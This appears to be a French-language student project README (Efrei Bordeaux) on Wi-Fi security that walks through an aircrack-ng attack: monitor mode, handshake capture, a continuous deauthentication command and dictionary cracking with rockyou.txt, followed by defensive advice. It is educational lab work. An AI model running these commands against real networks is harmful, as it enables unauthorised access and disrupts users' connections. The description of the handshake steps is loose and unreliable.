<div align="center">

![Header](https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,100:00f2ff&height=120&section=header&text=&fontSize=0)

</div>


# ð¡ Le Hacking Sans Fil : Concepts, MÃ©thodes et SÃ©curitÃ©

<div align="center">

![WiFi](https://img.shields.io/badge/IEEE_802.11-WPA2/WPA3-00b4d8?style=for-the-badge&logo=wifi&logoColor=white) ![Aircrack](https://img.shields.io/badge/Aircrack--ng-CC0000?style=for-the-badge&logo=linux&logoColor=white) ![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white) ![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)

![Efrei](https://img.shields.io/badge/Efrei_Bordeaux-Mastère_Cybersécurité-purple?style=flat-square) ![Type](https://img.shields.io/badge/Type-Wireless_Security_Research-blue?style=flat-square) ![Status](https://img.shields.io/badge/Status-Terminé-success?style=flat-square)

> ⚠️ **Avertissement légal** : Ce projet est réalisé dans un environnement de laboratoire contrôlé à des fins strictement pédagogiques.

</div>

> **Ãtude technique sur l'exploitation et la sÃ©curisation des rÃ©seaux IEEE 802.11.**


## ð¯ 1. Introduction au Wi-Fi Hacking
Le hacking sans fil consiste Ã  exploiter les vulnÃ©rabilitÃ©s inhÃ©rentes aux protocoles et aux configurations des rÃ©seaux sans fil pour obtenir un accÃ¨s non autorisÃ©. 




### Pourquoi cette Ã©tude est-elle cruciale ?
Avec la prolifÃ©ration des objets connectÃ©s (IoT), les rÃ©seaux sans fil sont devenus des cibles de choix. Comprendre ces menaces est l'unique moyen de mettre en place des contre-mesures efficaces.

---

## ð 2. Panorama des Technologies et Protocoles
Le projet couvre les technologies majeures (Wi-Fi, Bluetooth, Zigbee) et analyse l'Ã©volution de la sÃ©curitÃ©.

### Ãvolution de la SÃ©curitÃ© Wi-Fi
| Protocole | MÃ©canisme | Ãtat de SÃ©curitÃ© |
| :--- | :--- | :--- |
| **WEP** | ClÃ©s statiques, IV courts. | **ObsolÃ¨te** (VulnÃ©rable aux attaques IV). |
| **WPA** | Utilise TKIP pour des clÃ©s dynamiques. | **Faible** (Sensible aux attaques par dictionnaire). |
| **WPA2** | Standard actuel basÃ© sur AES. | **Robuste** mais sensible via le Handshake. |
| **WPA3** | Protection contre la force brute. | **RecommandÃ©** (Standard le plus sÃ»r). |

---

## ð¤ 3. Le Handshake : Le CÅur de l'Authentification
Le **Handshake Wi-Fi** est une procÃ©dure en 4 Ã©tapes permettant d'Ã©tablir une connexion sÃ©curisÃ©e entre un client et un point d'accÃ¨s.

1.  **Initiation (Request)**.
2.  **RÃ©ponse (Response)**.
3.  **Validation (Reconfirmation)**.
4.  **Finalisation (Confirmation)**.




---

## ð ï¸ 4. MÃ©thodologie d'Attaque (DÃ©monstration Technique)
L'attaque suit un cycle rigoureux de reconnaissance, de scanning et d'exploitation.

### Ãtape 1 : Reconnaissance et Footprinting
Identification des cibles potentielles (BSSID, SSID) via des scans passifs.


### Ãtape 2 : Capture du Handshake
Pour craquer une clÃ©, l'attaquant doit capturer l'Ã©change initial. Si aucun client n'est connectÃ©, on utilise une **attaque de dÃ©-authentification** pour forcer une reconnexion.

**Commandes critiques (Suite Aircrack-ng) :**
```bash
# 1. Passer l'interface en mode monitor
airmon-ng start wlan0
```
<img width="945" height="567" alt="image" src="https://github.com/user-attachments/assets/1c6c75eb-036c-499f-80c7-0f30861408dd" />

```bash
# 2. Scanner les rÃ©seaux pour identifier la cible (BSSID/Canal)
airodump-ng wlanmon0
```
<img width="945" height="572" alt="image" src="https://github.com/user-attachments/assets/6a901f1d-492e-474d-b66b-8f12a8bf126d" />

```bash
# 3. Cibler le point d'accÃ¨s et capturer les paquets
airodump-ng -w capture --bssid <BSSID> -c <CH> wlanmon0
```
<img width="945" height="455" alt="image" src="https://github.com/user-attachments/assets/f3dd88c0-426e-4199-a26f-a9461bc6e43e" />

```bash
# 4. Forcer la dÃ©connexion des utilisateurs pour saisir le handshake
aireplay-ng --deauth 0 -a <BSSID> wlanmon0
```
<img width="945" height="397" alt="image" src="https://github.com/user-attachments/assets/82520df7-a2ca-4495-9293-d8f6ef5068de" />


### Ãtape 3 : Craquage par Dictionnaire
Une fois le fichier `.cap` obtenu, on utilise une liste de mots de passe pour dÃ©river la clÃ©.
```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```
<img width="945" height="516" alt="image" src="https://github.com/user-attachments/assets/c0242786-0132-4f46-a3c9-4fe24a42b50c" />

---

## ð¡ï¸ 5. StratÃ©gies de DÃ©fense et Audit
La sÃ©curitÃ© ne repose pas sur un seul outil, mais sur une hygiÃ¨ne rÃ©seau stricte.

*   **Chiffrement Fort :** Migration impÃ©rative vers le **WPA3**.
*   **HygiÃ¨ne des Mots de Passe :** Utilisation de clÃ©s complexes et uniques.
*   **Maintenance :** Mise Ã  jour rÃ©guliÃ¨re du firmware des routeurs.
*   **DiscrÃ©tion :** DÃ©sactivation du SSID pour limiter la visibilitÃ© face aux scanners.



---

## ð Conclusion
Ce projet dÃ©montre que la sÃ©curitÃ© des rÃ©seaux sans fil est un Ã©quilibre fragile entre technologie et vigilance humaine. L'utilisation d'outils comme **Wireshark** et **Kismet** permet de dÃ©tecter les activitÃ©s suspectes avant qu'une intrusion ne rÃ©ussisse.

---

### ð Ressources du Projet
*   **Rapport complet :** `Projet_SSI.docx`
*   **Guide des commandes :** `commandes_aircrack.pdf`
*   **PrÃ©sentation visuelle :** `Le-Hacking-Sans-Fil.pdf`

---

**Analogie pour comprendre :**
Le hacking Wi-Fi, c'est comme essayer de **crocheter une serrure numÃ©rique**. Le Handshake est le moment oÃ¹ la clÃ© entre dans la serrure. L'attaquant enregistre le son du mÃ©canisme (capture du handshake) puis, une fois rentrÃ© chez lui, fabrique des milliers de fausses clÃ©s (dictionnaire) jusqu'Ã  ce qu'il trouve celle qui produit exactement le mÃªme son (craquage).


---

<div align="center">

### 🔗 Liens

[![Portfolio](https://img.shields.io/badge/Portfolio-00f2ff?style=for-the-badge&logo=firefox&logoColor=black)](https://kim-san04.github.io) [![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/hakim-sawadogo) [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kim-San04)

**Cheick Abdel Hadime Hakim SAWADOGO**
*Mastère Cybersécurité, Réseaux & Cloud — Efrei Bordeaux*
📧 cheick.sawadogo@efrei.net

![Footer](https://capsule-render.vercel.app/api?type=waving&color=0:00f2ff,100:0d1117&height=80&section=footer)

</div>
